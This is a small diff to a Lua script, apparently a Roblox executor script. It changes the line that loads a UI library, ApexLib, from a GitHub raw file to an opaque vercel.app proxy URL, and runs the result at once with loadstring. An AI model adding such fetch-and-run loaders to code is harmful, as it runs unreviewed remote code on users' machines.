@@ -40,7 +40,7 @@ end
 -- ==========================================
 -- [ LOAD APEXLIB ]
 -- ==========================================
-local ApexLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Teapokk/ApexLib/refs/heads/main/ApexLib.lua"))()
+local ApexLib = loadstring(game:HttpGet("https://apexproxy.vercel.app/api/proxy"))()
 
 -- ==========================================
 -- [ FILE SYSTEM SETUP (Save/Load) ]
